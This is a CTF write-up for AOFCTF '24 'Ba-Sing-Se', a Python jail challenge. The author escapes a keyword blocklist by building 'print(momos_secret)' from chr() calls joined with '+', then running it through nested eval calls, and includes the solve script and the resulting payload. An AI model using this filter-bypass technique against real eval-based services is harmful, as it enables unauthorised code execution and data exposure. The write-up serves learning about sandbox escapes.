---
title: AOFCTF '24 - Misc - Ba-Sing-Se
date: '2024-04-29'
tags: ['misc', 'aofctf', 'pyjail', 'eval-in-eval']
draft: false
summary: Using eval inside an eval to build a python code using chr function
---

## Challenge Description

![alt text](/static/writeups/aofctf-24/image-20.png)

## Solution

Ba-Sing-Se was a heavily avatar inspired challenge. The provided source code was:
...
Now, the code is pretty simple, it simply blocks the following:
...
> I'm pretty sure there are other solutions that I do not know of.

What's pretty interesting here is:
...
`eval` inside an `eval` function. This allowed us to build a python code at runtime; what I mean by that is, if we look at the blocklist, `chr` isn't blocked and inside the BLACKLIST_OPERATORS, `+` isn't blocked either. So that allowed us to build a python code at runtime. But, what python code?, looking at this line:

```py
momos_secret = __read__("flag.txt", __default="You got the flag.")
```

`momos_secret` would contain the flag. So, what we need it, simply write a payload that invokes `print(momos_secret)`. I wrote a simple solve script for this:
...
payload = ""
for i in src: payload += f'chr({ord(i)})+'
payload = payload[:-1]
print(payload)
```

This would print: `chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(109)+chr(111)+chr(109)+chr(111)+chr(115)+chr(95)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(41)`
...
eval(
    eval(
        chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(109)+chr(111)+chr(109)+chr(111)+chr(115)+chr(95)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(41)
    )
)
```

After the first eval call:
...
Which, in the next run would give us the flag!
